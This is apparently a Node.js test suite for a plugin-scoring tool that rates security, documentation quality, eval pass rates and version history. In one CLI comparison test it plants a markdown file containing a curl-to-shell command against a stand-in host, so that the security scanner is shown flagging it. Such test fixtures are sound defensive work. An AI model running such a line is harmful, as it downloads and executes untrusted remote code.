import { test } from 'node:test';
import assert from 'node:assert/strict';
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { loadRepo } from '../scripts/lib/plugins.mjs';
import {
  securityScore, qualityScore, evalsFor, adoption, scorePlugin, skillspectorMap,
  skillCheckScores, skillscoreScores, markdownlintCount, lycheeCount, cspellCount, docsHygieneScore,
  weightedQuality, readQualityReports, QUALITY_CRITERIA, DOCS_K, QUALITY_METHOD,
  isTracked, historyRecord, planRecords, readHistory, writeRecords, historyPath, lastTrackedVersion,
  scoreChange, compareScores, formatCompare, band, main,
} from '../scripts/scores.mjs';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const SCORES = join(ROOT, 'scripts/scores.mjs');

/** A temp repo root holding a copy of one real plugin + taxonomy.json. */
function copyRepo(dir = 'adr-helper') {
  const root = mkdtempSync(join(tmpdir(), 'scores-'));
  cpSync(join(ROOT, 'plugins', dir), join(root, 'plugins', dir), { recursive: true });
  cpSync(join(ROOT, 'taxonomy.json'), join(root, 'taxonomy.json'));
  return root;
}

test('securityScore: 100 minus 40/HIGH and 10/MEDIUM, floored at 0; SkillSpector caps it', () => {
  assert.equal(securityScore([]).score, 100);
  assert.equal(securityScore([]).inputs, '0 HIGH, 0 MEDIUM; SkillSpector not run');
  const f = [{ severity: 'HIGH' }, { severity: 'MEDIUM' }, { severity: 'MEDIUM' }];
  assert.equal(securityScore(f).score, 40);
  assert.equal(securityScore([...f, { severity: 'HIGH' }, { severity: 'HIGH' }]).score, 0);
  const s = securityScore([{ severity: 'MEDIUM' }], 25);
  assert.equal(s.score, 75); // min(90, 100 − 25)
  assert.equal(s.rules_score, 90);
  assert.equal(s.inputs, '0 HIGH, 1 MEDIUM; SkillSpector risk 25/100');
  assert.equal(securityScore([], 0).score, 100);
});

test('band: good ≥90, fair ≥70, poor below', () => {
  assert.deepEqual([band(100), band(90), band(89), band(70), band(69), band(null)], ['good', 'good', 'fair', 'fair', 'poor', 'none']);
});

const QFIX = join(ROOT, 'tests/fixtures/quality');

test('tool report parsers read the real skill-check, skillscore, markdownlint, lychee and cspell output', () => {
  const r = readQualityReports(QFIX)['adr-helper'];
  assert.deepEqual(skillCheckScores(r['skill-check']), { 'create-adr': 85, 'supersede-adr': 75 });
  assert.deepEqual(skillscoreScores(r.skillscore), { 'create-adr': 82, 'supersede-adr': 68 });
  assert.equal(markdownlintCount(r.markdownlint), 6);
  assert.equal(lycheeCount(r.lychee), 0);
  assert.equal(cspellCount(r.cspell), 12);
  // "did not run" is null, never zero findings
  assert.equal(markdownlintCount(''), null);
  assert.equal(cspellCount('CSpell: Files checked: 0, Issues found: 0 in 0 files with 1 error.'), null);
  assert.equal(lycheeCount({}), null);
  assert.deepEqual(skillCheckScores(null), {});
  assert.equal(readQualityReports(join(QFIX, 'missing')), null);
});

test('docsHygieneScore: round(100 × e^(−k × findings per 100 lines)), k documented', () => {
  assert.equal(DOCS_K, 0.1);
  assert.equal(docsHygieneScore(0, 400), 100);
  assert.equal(docsHygieneScore(4, 400), 90); // 1 per 100 lines
  assert.equal(docsHygieneScore(8, 400), 82); // 2
  assert.equal(docsHygieneScore(12, 400), 74); // 3: "a few issues" lands in the 70s–80s
  assert.equal(docsHygieneScore(20, 400), 61);
  assert.equal(docsHygieneScore(3, 0), 100); // no markdown at all
});

test('weightedQuality: components that did not run are re-weighted, never counted as passed', () => {
  const c = (score, weight) => ({ score, weight });
  assert.equal(weightedQuality([c(80, 55), c(100, 25), c(90, 20)]), Math.round((80 * 55 + 100 * 25 + 90 * 20) / 100));
  assert.equal(weightedQuality([c(null, 55), c(100, 25), c(90, 20)]), Math.round((100 * 25 + 90 * 20) / 45));
  assert.equal(weightedQuality([c(null, 55), c(null, 25), c(null, 20)]), null);
  assert.deepEqual(QUALITY_CRITERIA.map((x) => [x.id, x.weight]), [['linters', 55], ['best-practice', 25], ['docs', 20]]);
});

test('quality from saved tool reports: weighted parts with per-tool details', () => {
  const root = copyRepo();
  try {
    const repo = loadRepo(root);
    const s = scorePlugin({ root, repo, plugin: repo.plugins[0], qualityReports: readQualityReports(QFIX) });
    const q = s.quality;
    assert.equal(q.max, 100);
    assert.equal(q.method, QUALITY_METHOD);
    const by = Object.fromEntries(q.criteria.map((c) => [c.id, c]));
    assert.deepEqual(by.linters.parts, { 'skill-check': 80, skillscore: 75 });
    assert.equal(by.linters.score, 78); // mean(80, 75) = 77.5
    assert.match(by.linters.detail, /skill-check 80 \(create-adr 85, supersede-adr 75\); skillscore 75 \(create-adr 82, supersede-adr 68\)/);
    assert.ok(by['best-practice'].ran && by['best-practice'].score > 0);
    assert.equal(by.docs.parts.markdownlint, 6);
    assert.equal(by.docs.parts.cspell, 12);
    assert.equal(by.docs.score, docsHygieneScore(18, by.docs.parts.lines));
    assert.match(by.docs.detail, /markdownlint 6, lychee 0, cspell 12: 18 findings in \d+ lines/);
    assert.ok(q.criteria.every((c) => c.ran));
    assert.equal(q.score, weightedQuality(q.criteria));
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('quality without tool reports: linters and docs are "not run", best-practice alone counts', () => {
  const root = copyRepo();
  try {
    const repo = loadRepo(root);
    const q = scorePlugin({ root, repo, plugin: repo.plugins[0] }).quality;
    const by = Object.fromEntries(q.criteria.map((c) => [c.id, c]));
    assert.deepEqual([by.linters.ran, by.docs.ran, by['best-practice'].ran], [false, false, true]);
    assert.equal(by.linters.score, null);
    assert.match(by.linters.detail, /skill-check: not run; skillscore: not run/);
    assert.match(by.docs.detail, /not run/);
    assert.equal(q.score, by['best-practice'].score);
    // One linter missing: the other one stands for the part, and the detail says so.
    const only = qualityScore(repo.plugins[0], { root, reports: { skillscore: readQualityReports(QFIX)['adr-helper'].skillscore } });
    const lin = only.criteria.find((c) => c.id === 'linters');
    assert.equal(lin.score, 75);
    assert.match(lin.detail, /skill-check: not run/);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('real plugins score 100 security (no findings) and differ on quality', () => {
  const root = mkdtempSync(join(tmpdir(), 'scores-'));
  try {
    cpSync(join(ROOT, 'plugins'), join(root, 'plugins'), { recursive: true });
    cpSync(join(ROOT, 'taxonomy.json'), join(root, 'taxonomy.json'));
    const repo = loadRepo(root);
    const all = repo.plugins.map((p) => scorePlugin({ root, repo, plugin: p }));
    assert.ok(all.every((s) => s.security.score === 100));
    assert.ok(all.every((s) => s.quality.criteria.map((c) => c.id).join() === 'linters,best-practice,docs'));
    assert.ok(all.every((s) => typeof s.quality.score === 'number'));
  } finally { rmSync(root, { recursive: true, force: true }); }
});

const RUNS = { runs: [
  { plugin: 'adr-helper', version: '1.1.0', measured_at: '2026-11-08T11:46:00Z', with_skill: { passed: 22, total: 22 }, baseline: { passed: 17, total: 22 }, method: 'm' },
  { plugin: 'go-conventions', version: '1.0.0', measured_at: '2026-11-08T11:52:00Z', with_skill: { passed: 22, total: 22 }, baseline: { passed: 19, total: 22 } },
] };

test('evalsFor: pass rate, delta and version; earlier-version flag; none for older versions', () => {
  const e = evalsFor(RUNS, 'adr-helper', '1.1.0');
  assert.equal(e.pass_rate, 100);
  assert.equal(e.baseline_pass_rate, 77.3);
  assert.equal(e.delta, 22.7);
  assert.equal(e.earlier_version, false);
  assert.equal(evalsFor(RUNS, 'adr-helper', '1.1.1').earlier_version, true);
  assert.equal(evalsFor(RUNS, 'adr-helper', '1.0.0'), null); // measured on a newer version
  assert.equal(evalsFor(RUNS, 'nope', '1.0.0'), null);
  assert.equal(evalsFor(null, 'adr-helper', '1.1.0'), null);
});

test('real evals/results.json has the three measured runs', () => {
  const r = JSON.parse(readFileSync(join(ROOT, 'evals/results.json'), 'utf8'));
  assert.equal(evalsFor(r, 'typescript-conventions', '1.0.1').pass_rate, 76); // npm run eval with offline deps, 1.0.1
  const go = evalsFor(r, 'go-conventions', '1.0.0');
  assert.deepEqual([go.passed, go.baseline_passed, go.delta, go.method], [19, 16, 13.7, 'claude plugin eval']);
});

test('adoption counts distinct active consumer repos', () => {
  assert.deepEqual(adoption([{ consumer: 'o/a', status: 'active' }, { consumer: 'o/a', status: 'active' }, { consumer: 'o/b', status: 'removed' }, { consumer: 'o/c' }]), { active_consumers: 2 });
  assert.deepEqual(adoption(null), { active_consumers: 0 });
});

test('skillspectorMap reads risk_assessment.score per <plugin>.json report', () => {
  assert.deepEqual(skillspectorMap({ 'adr-helper.json': { risk_assessment: { score: 0 } }, 'bad.json': {}, 'Bad Name.json': { risk_assessment: { score: 5 } } }), { 'adr-helper': 0 });
});

test('isTracked: first version and higher major/minor are tracked; patches are not', () => {
  assert.deepEqual(isTracked('1.0.0', null), { tracked: true, reason: 'first' });
  assert.deepEqual(isTracked('0.1.3', null), { tracked: true, reason: 'first' });
  assert.deepEqual(isTracked('1.1.0', '1.0.0'), { tracked: true, reason: 'minor' });
  assert.deepEqual(isTracked('2.0.0', '1.4.0'), { tracked: true, reason: 'major' });
  assert.deepEqual(isTracked('1.1.1', '1.1.0'), { tracked: false, reason: 'patch' });
  assert.deepEqual(isTracked('1.0.1', '1.0.0'), { tracked: false, reason: 'patch' });
  assert.deepEqual(isTracked('1.2.1', '1.0.0'), { tracked: true, reason: 'minor' }); // skipped 1.2.0
  assert.deepEqual(isTracked('1.0.0', '1.1.0'), { tracked: false, reason: 'older' });
});

const rec = (plugin, version, at, extra = {}) => ({ recorded_at: at, plugin, version, tag: `${plugin}--v${version}`, commit_sha: 'x', security: 100, quality: 90, ...extra });

test('planRecords: appends only tracked, unseen tags; latest keeps the newest version incl. patches; idempotent', () => {
  const cands = [rec('a', '1.0.0', 'T1'), rec('a', '1.1.0', 'T2'), rec('a', '1.1.1', 'T3'), rec('b', '1.0.1', 'T4')].map((record) => ({ record }));
  const p1 = planRecords([], null, cands, 'NOW');
  assert.deepEqual(p1.append.map((r) => r.tag), ['a--v1.0.0', 'a--v1.1.0', 'b--v1.0.1']);
  assert.equal(p1.latest.plugins.a.version, '1.1.1');
  assert.equal(p1.latest.plugins.a.tracked, false);
  assert.equal(p1.latest.plugins.a.reason, 'patch');
  assert.equal(p1.latest.plugins.b.tracked, true);
  assert.equal(p1.latest.updated_at, 'NOW');
  const p2 = planRecords(p1.append, p1.latest, cands, 'LATER');
  assert.deepEqual(p2.append, []);
  assert.equal(p2.changed, false);
  assert.equal(p2.latest.updated_at, 'NOW');
});

test('writeRecords + readHistory: Athena-style partitions by recorded_at day', () => {
  const dir = mkdtempSync(join(tmpdir(), 'scores-data-'));
  try {
    const plan = planRecords([], null, [{ record: rec('a', '1.0.0', '2026-11-08T10:00:00.000Z') }, { record: rec('a', '1.1.0', '2026-12-01T09:00:00.000Z') }], 'NOW');
    writeRecords(dir, plan);
    assert.equal(historyPath('2026-12-01T09:00:00.000Z'), join('scores', 'year=2026', 'month=12', '2026-12-01.ndjson'));
    assert.ok(existsSync(join(dir, 'scores/year=2026/month=11/2026-11-08.ndjson')));
    assert.deepEqual(readHistory(dir).map((r) => r.version), ['1.0.0', '1.1.0']);
    assert.equal(JSON.parse(readFileSync(join(dir, 'latest/scores.json'), 'utf8')).plugins.a.version, '1.1.0');
    assert.equal(lastTrackedVersion(readHistory(dir), 'a', '1.1.0'), '1.0.0');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('historyRecord has the data-branch shape; SkillSpector null carries a note', () => {
  const scores = { security: securityScore([]), quality: { score: 85, method: 'm1', criteria: [{ id: 'docs', weight: 20, score: 90, ran: true, detail: 'ok', label: 'L' }] }, evals: evalsFor(RUNS, 'go-conventions', '1.0.0') };
  const r = historyRecord({ recordedAt: '2026-11-08T11:13:05.000Z', plugin: 'go-conventions', version: '1.0.0', tag: 'go-conventions--v1.0.0', commitSha: 'abc', scores });
  assert.deepEqual(Object.keys(r), ['recorded_at', 'plugin', 'version', 'tag', 'commit_sha', 'security', 'security_inputs', 'quality', 'quality_method', 'quality_criteria', 'evals', 'skillspector_risk', 'skillspector_note']);
  assert.deepEqual(r.evals, { pass_rate: 100, baseline_pass_rate: 86.4, measured_at: '2026-11-08T11:52:00Z', measured_version: '1.0.0' });
  assert.equal(r.skillspector_risk, null);
  assert.equal(r.quality_method, 'm1');
  assert.deepEqual(r.quality_criteria, [{ id: 'docs', weight: 20, score: 90, ran: true, detail: 'ok' }]);
});

test('scoreChange: points vs the previous tracked record', () => {
  const cur = { security: { score: 100 }, quality: { score: 85 }, evals: { pass_rate: 92 } };
  assert.deepEqual(scoreChange(cur, { version: '1.0.0', security: 60, quality: 100, evals: { pass_rate: 92 }, skillspector_risk: 0 }),
    { vs_version: '1.0.0', security: 40, security_basis: 'rules + SkillSpector', quality: -15, evals: 0 });
  assert.equal(scoreChange(cur, null), null);
  // Previous record had no SkillSpector risk: compare the current rules-only score (like for like).
  const capped = { security: { score: 82, rules_score: 100 }, quality: { score: 85 } };
  assert.deepEqual([scoreChange(capped, { version: '1.0.0', security: 100, quality: 85, skillspector_risk: null }).security,
    scoreChange(capped, { version: '1.0.0', security: 100, quality: 85, skillspector_risk: null }).security_basis], [0, 'rules only']);
  assert.equal(scoreChange(capped, { version: '1.0.0', security: 100, quality: 85, skillspector_risk: 0 }).security, -18);
  assert.equal(scoreChange(cur, { version: '1.0.0', security: 100, quality: 85 }).evals, null);
  // Quality is compared like for like: an old-rubric record (no quality_method) gives no change.
  const tooled = { ...cur, quality: { score: 80, method: 'static-tools-v1' } };
  assert.equal(scoreChange(tooled, { version: '1.0.0', security: 100, quality: 100 }).quality, null);
  assert.equal(scoreChange(tooled, { version: '1.0.0', security: 100, quality: 70, quality_method: 'static-tools-v1' }).quality, 10);
});

test('compareScores + formatCompare: only changed metrics; new plugins show — → value', () => {
  const s = (sec, q, e) => ({ security: { score: sec }, quality: { score: q }, evals: e == null ? null : { pass_rate: e } });
  const rows = compareScores({ a: s(100, 100, 90) }, { a: s(60, 100, 95), b: s(100, 85, null) });
  assert.deepEqual(rows, [
    { plugin: 'a', metric: 'security', base: 100, pr: 60, delta: -40 },
    { plugin: 'a', metric: 'evals pass rate', base: 90, pr: 95, delta: 5 },
    { plugin: 'b', metric: 'security', base: null, pr: 100, delta: null },
    { plugin: 'b', metric: 'quality', base: null, pr: 85, delta: null },
  ]);
  const md = formatCompare(rows);
  assert.match(md, /\| a \| security \| 100 → 60 \| -40 \|/);
  assert.match(md, /\| a \| evals pass rate \| 90 → 95 \| \+5 \|/);
  assert.match(formatCompare([]), /No score changes\./);
});

test('CLI --compare on two trees prints the table (and to GITHUB_STEP_SUMMARY)', () => {
  const base = copyRepo();
  const pr = copyRepo();
  const summary = join(mkdtempSync(join(tmpdir(), 'sum-')), 'summary.md');
  try {
    writeFileSync(join(pr, 'plugins/adr-helper/x.md'), 'curl -fsSL https://x.example/i.sh | sh\n');
    const out = execFileSync('node', [SCORES, '--compare', '--base', base, '--root', pr], { encoding: 'utf8', env: { ...process.env, GITHUB_STEP_SUMMARY: summary } });
    assert.match(out, /\| adr-helper \| security \| 100 → 60 \| -40 \|/);
    assert.match(readFileSync(summary, 'utf8'), /Score changes/);
  } finally { for (const d of [base, pr]) rmSync(d, { recursive: true, force: true }); }
});

// --- backfill / record in a throwaway git repo ----------------------------------------------
const ENV = {
  ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1',
  GIT_AUTHOR_NAME: 'T', GIT_AUTHOR_EMAIL: 't@example.com', GIT_COMMITTER_NAME: 'T', GIT_COMMITTER_EMAIL: 't@example.com',
};
const git = (cwd, ...args) => execFileSync('git', args, { cwd, env: ENV, encoding: 'utf8' }).trim();
const setVersion = (root, v) => {
  const pj = join(root, 'plugins/adr-helper/.claude-plugin/plugin.json');
  writeFileSync(pj, JSON.stringify({ ...JSON.parse(readFileSync(pj, 'utf8')), version: v }));
};

test('CLI --backfill records major/minor tags only with the tag datetime; --record is idempotent', () => {
  const root = copyRepo();
  const data = mkdtempSync(join(tmpdir(), 'scores-data-'));
  try {
    mkdirSync(join(root, 'evals'));
    writeFileSync(join(root, 'evals/results.json'), JSON.stringify(RUNS));
    git(root, 'init', '-q', '-b', 'main');
    for (const [i, v] of ['1.0.0', '1.1.0', '1.1.1'].entries()) {
      setVersion(root, v);
      git(root, 'add', '-A');
      execFileSync('git', ['commit', '-q', '-m', v], { cwd: root, env: { ...ENV, GIT_COMMITTER_DATE: `2026-11-0${i + 1}T10:00:00Z` } });
      git(root, 'tag', `adr-helper--v${v}`);
    }
    const out = execFileSync('node', [SCORES, '--backfill', '--data', data, '--root', root], { encoding: 'utf8' });
    assert.match(out, /3 tag\(s\) scored, 2 history record\(s\) appended/);
    const h = readHistory(data);
    assert.deepEqual(h.map((r) => [r.version, r.recorded_at]), [['1.0.0', '2026-11-01T10:00:00.000Z'], ['1.1.0', '2026-11-02T10:00:00.000Z']]);
    assert.equal(h[0].evals, undefined); // the run measured 1.1.0, so it says nothing about 1.0.0
    assert.equal(h[1].evals.pass_rate, 100);
    assert.equal(h[0].skillspector_note, 'SkillSpector not run (backfill)');
    const latest = JSON.parse(readFileSync(join(data, 'latest/scores.json'), 'utf8')).plugins['adr-helper'];
    assert.deepEqual([latest.version, latest.tracked, latest.reason], ['1.1.1', false, 'patch']);
    const again = execFileSync('node', [SCORES, '--record', '--data', data, '--root', root, '--now', '2026-11-09T00:00:00.000Z'], { encoding: 'utf8' });
    assert.match(again, /1 tag\(s\) scored, 0 history record\(s\) appended; latest\/scores.json unchanged/);
  } finally { for (const d of [root, data]) rmSync(d, { recursive: true, force: true }); }
});

test('main rejects unknown arguments', () => {
  assert.equal(main(['--nope'], () => {}), 2);
});

test('planRecords: a same-version record with SkillSpector data upgrades a latest entry that had none', () => {
  const backfilled = { plugin: 'typescript-conventions', version: '1.0.1', tag: 'typescript-conventions--v1.0.1', recorded_at: '2026-11-08T12:42:00Z', security: 100, skillspector_risk: null };
  const scored = { ...backfilled, recorded_at: '2026-11-08T13:14:00Z', security: 82, skillspector_risk: 18 };
  const p = planRecords([], { updated_at: 'OLD', plugins: { 'typescript-conventions': { ...backfilled, tracked: false, reason: 'patch' } } }, [{ record: scored }], 'NOW');
  assert.equal(p.latest.plugins['typescript-conventions'].security, 82);
  assert.equal(p.latest.plugins['typescript-conventions'].skillspector_risk, 18);
  assert.equal(p.changed, true);
  // ...but a same-version record WITHOUT SkillSpector never downgrades one that has it.
  const p2 = planRecords([], p.latest, [{ record: backfilled }], 'LATER');
  assert.equal(p2.latest.plugins['typescript-conventions'].skillspector_risk, 18);
});
